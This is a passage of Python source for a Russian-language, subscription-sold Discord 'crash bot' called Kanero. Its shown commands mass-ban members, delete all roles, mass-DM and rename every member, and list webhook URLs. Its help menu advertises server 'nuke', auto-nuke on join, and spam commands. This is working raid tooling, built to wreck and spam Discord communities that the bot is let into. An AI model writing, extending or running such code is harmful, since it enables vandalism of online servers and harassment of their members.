            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        targets = [m for m in guild.members if m.id not in (interaction.user.id, bot.user.id, guild.owner_id)]
        await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
        await interaction.followup.send("✅ Готово.", ephemeral=True)

    @bot.tree.command(name="webhooks", description="🔱 Список вебхуков")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_webhooks(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        whs = await interaction.guild.webhooks()
        if not whs:
            await interaction.response.send_message("Вебхуков нет.", ephemeral=True); return
        msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
        await interaction.response.send_message(f"```{msg[:1900]}```", ephemeral=True)

    # ── SLASH: только Premium ───────────────────────────────

    @bot.tree.command(name="massdm", description="💎 [Premium] Масс ДМ всем участникам")
    @app_commands.describe(text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_massdm(interaction: discord.Interaction, text: str):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        members = [m for m in interaction.guild.members if not m.bot]
        await interaction.followup.send(f"📨 Рассылаю ДМ **{len(members)}** участникам...", ephemeral=True)
        sent = 0
        for member in members:
            try:
                await member.send(text); sent += 1
            except Exception:
                pass
            await asyncio.sleep(0.5)
        await interaction.followup.send(f"✅ Отправлено: **{sent}**", ephemeral=True)

    @bot.tree.command(name="massban", description="💎 [Premium] Забанить всех участников")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_massban(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        guild = interaction.guild
        bot_role = guild.me.top_role
        targets = [m for m in guild.members if not m.bot and m.id != guild.owner_id and (not m.top_role or m.top_role < bot_role)]
        results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
        banned = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"💀 Забанено: **{banned}**", ephemeral=True)

    @bot.tree.command(name="rolesdelete", description="💎 [Premium] Удалить все роли")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_rolesdelete(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        bot_role = interaction.guild.me.top_role
        results = await asyncio.gather(*[r.delete() for r in interaction.guild.roles if r < bot_role and not r.is_default()], return_exceptions=True)
        deleted = sum(1 for r in results if not isinstance(r, Exception))
        await interaction.followup.send(f"🗑️ Удалено ролей: **{deleted}**", ephemeral=True)

    @bot.tree.command(name="serverinfo", description="💎 [Premium] Инфо о сервере")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_serverinfo(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        guild = interaction.guild
        embed = discord.Embed(title=f"☠️ {guild.name}", color=0x0a0a0a)
        embed.add_field(name="👥 Участников", value=str(guild.member_count))
        embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
        embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
        embed.add_field(name="💎 Буст", value=f"Уровень {guild.premium_tier} ({guild.premium_subscription_count} бустов)")
        embed.add_field(name="👑 Овнер", value=str(guild.owner))
        embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.set_footer(text="☠️ Kanero")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @bot.tree.command(name="userinfo", description="💎 [Premium] Инфо о пользователе")
    @app_commands.describe(user_id="Discord ID пользователя")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_userinfo(interaction: discord.Interaction, user_id: str = None):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        if user_id:
            try:
                user = await bot.fetch_user(int(user_id))
            except Exception:
                await interaction.response.send_message("❌ Пользователь не найден.", ephemeral=True); return
        else:
            user = interaction.user
        member = interaction.guild.get_member(user.id) if interaction.guild else None
        embed = discord.Embed(title=f"👁️ {user}", color=0x0a0a0a)
        embed.add_field(name="🆔 ID", value=str(user.id))
        embed.add_field(name="📅 Создан", value=user.created_at.strftime("%d.%m.%Y"))
        if member:
            embed.add_field(name="📥 Зашёл", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
            embed.add_field(name="🎭 Роль", value=member.top_role.mention)
            embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
        if user.avatar:
            embed.set_thumbnail(url=user.avatar.url)
        embed.set_footer(text="☠️ Kanero")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    # ── SLASH: /help — показывает команды по уровню доступа ─

    @bot.tree.command(name="help", description="☠️ Список команд бота")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def slash_help(interaction: discord.Interaction):
        uid = interaction.user.id
        wl = is_whitelisted(uid)
        pm = is_premium(uid) or uid == config.OWNER_ID

        if not wl:
            embed = discord.Embed(
                title="☠️ Kanero — CRASH BOT",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        embed = discord.Embed(
            title="☠️ Kanero — CRASH BOT",
            description=(
                "```\n"
                "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
                " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
                " ██║     ██████╔╝███████║███████╗███████║\n"
                " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
                "```"
            ),
            color=0x0a0a0a
        )
        embed.add_field(
            name="💀 УНИЧТОЖЕНИЕ",
            value=(
                "`!nuke` `/nuke` — краш сервера\n"
                "`!stop` `/stop` — остановить краш\n"
                "`!cleanup` — снести всё, оставить один канал\n"
                "`!auto_nuke on/off/info` — авто-краш при входе"
            ),
            inline=False
        )
        embed.add_field(
            name="⚡ КОНТРОЛЬ",
            value=(
                "`!rename` `/rename` — переименовать каналы\n"
                "`!nicks_all` `/nicks_all` — сменить ники\n"
                "`!webhooks` `/webhooks` — список вебхуков"
            ),
            inline=False
        )
        embed.add_field(
            name="💬 СПАМ",
            value=(
                "`/sp` — спам (макс 50, кд 5 мин)\n"
                "`/spkd` — спам с задержкой"
            ),
            inline=False
        )
        if pm:
            embed.add_field(
                name="💎 PREMIUM",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!super_nuke [текст]` — нюк всё одновременно\n"
                    "`!massdm` `/massdm` — масс ДМ\n"
                    "`!massban` `/massban` — массбан\n"
                    "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
                    "`!rolesdelete` `/rolesdelete` — удалить роли\n"
                    "`!serverinfo` `/serverinfo` — инфо о сервере\n"
                    "`!userinfo` `/userinfo` — инфо о юзере\n"
                    "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
                    "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
                    "`!snuke_config` — настройка авто нюка"
                ),
                inline=False
            )
        embed.set_footer(text=f"☠️ Kanero  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
        embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    await bot.tree.sync()
    for guild in bot.guilds:
        bot.tree.clear_commands(guild=guild)
        await bot.tree.sync(guild=guild)

    print(f"Бот запущен как {bot.user}")


bot.run(config.TOKEN)


